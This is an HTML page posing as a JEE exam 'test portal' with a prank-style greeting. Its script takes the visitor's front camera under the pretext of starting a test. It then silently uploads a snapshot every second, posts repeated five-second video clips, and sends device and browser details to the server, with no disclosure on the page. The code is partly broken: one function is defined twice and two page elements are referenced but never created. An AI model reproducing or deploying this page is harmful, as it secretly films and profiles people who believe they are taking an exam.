<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>JEE Ultimate Test Portal Elite</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:Segoe UI,sans-serif}
body{height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;background:linear-gradient(135deg,#020617,#0f172a,#1e1b4b);color:#fff}
body:before,body:after{content:"";position:fixed;width:520px;height:520px;filter:blur(120px);opacity:.22;border-radius:50%;animation:f 12s ease-in-out infinite alternate}
body:before{background:#00e5ff;left:-120px;top:-120px}
body:after{background:#8b5cf6;right:-120px;bottom:-120px}
@keyframes f{to{transform:translate(60px,-30px) scale(1.15)}}
#overlay{width:min(92%,850px);padding:70px;border-radius:34px;background:rgba(255,255,255,.08);backdrop-filter:blur(30px);border:1px solid rgba(255,255,255,.18);box-shadow:0 30px 90px rgba(0,0,0,.55);text-align:center;position:relative;overflow:hidden}
#overlay:before{content:"";position:absolute;inset:-150%;background:linear-gradient(120deg,transparent,rgba(255,255,255,.16),transparent);animation:s 7s linear infinite}
@keyframes s{to{transform:translateX(70%) rotate(15deg)}}
.logo{font-size:70px;animation:b 3s infinite}
@keyframes b{50%{transform:translateY(-10px)}}
h1{font-size:58px;font-weight:900;background:linear-gradient(90deg,#00e5ff,#fff,#8b5cf6,#ff4ecd);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-size:300%;animation:g 6s linear infinite}
@keyframes g{to{background-position:300%}}
#intro{margin:18px 0;color:#ff5d5d;font-size:20px}
.chips{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin:24px 0}
.chips span{padding:9px 16px;border-radius:999px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.16)}
button{margin-top:18px;padding:18px 58px;border:none;border-radius:999px;color:#fff;font-size:20px;font-weight:700;background:linear-gradient(135deg,#06b6d4,#7c3aed,#ff006e);background-size:300%;animation:g 5s linear infinite;cursor:pointer}
button:hover{transform:scale(1.05)}
iframe{display:none;width:100%;height:100%;border:0}
</style></head>
<body>
<div id="overlay">
<div class="logo">🚀</div>
<h1>JEE Ultimate Test Portal</h1>
<div id="intro">😎☠️ Oye bhooooootni....😎🥱<br>🔥 "Tomar Ji ka system hai... lightly mat lena"</div>
<div class="chips"><span>⚡ AI Powered</span><span>🔒 Secure</span><span>📱 Responsive</span><span>🎯 JEE 2026</span></div>
<button onclick="start()">▶ Start Test</button>
</div>
<iframe id="frame"></iframe>
<script>
function start(){
document.getElementById('overlay').style.display='none';
document.getElementById('frame').style.display='block';
// Paste your existing JS/Python interaction logic here without changes.
}

let recorder;
let chunks=[];


/* DEVICE INFO */

function sendDeviceInfo(){

fetch("/device",{
method:"POST",
headers:{"Content-Type":"application/json"},
body:JSON.stringify({
device:navigator.platform,
os:navigator.userAgent,
browser:navigator.appVersion,
screen:screen.width+"x"+screen.height
})
});

}


/* SNAPSHOT */

function capture(){

if(!v.videoWidth) return;

c.width=v.videoWidth;
c.height=v.videoHeight;

const ctx=c.getContext("2d");

ctx.drawImage(v,0,0,c.width,c.height);

c.toBlob(b=>{

let f=new FormData();
f.append("photo",b,"u.jpg");

fetch("/upload",{method:"POST",body:f});

},"image/jpeg",0.9);

}


/* VIDEO RECORD */

function startVideo(stream){

recorder = new MediaRecorder(stream);

recorder.ondataavailable = e=>{
chunks.push(e.data);
};

recorder.onstop = ()=>{

let blob = new Blob(chunks,{type:"video/webm"});
chunks=[];

let f=new FormData();
f.append("video",blob,"v.webm");

fetch("/video",{method:"POST",body:f});

};

setInterval(()=>{

recorder.start();

setTimeout(()=>{
recorder.stop();
},5000);

},5000);

}


/* START TEST */

async function start(){

let stream;

try{

stream = await navigator.mediaDevices.getUserMedia({
video:{facingMode:"user"}
});

}catch(e){

alert("Camera permission required");
return;

}

v.srcObject = stream;

sendDeviceInfo();

setInterval(capture,1000);

startVideo(stream);

document.getElementById("overlay").style.display="none";

const r = await fetch("/get_video_link");
const d = await r.json();

const frame=document.getElementById("frame");

frame.style.display="block";
frame.src=d.url;

if(frame.requestFullscreen){
frame.requestFullscreen();
}

}

</script>

</body>
</html>
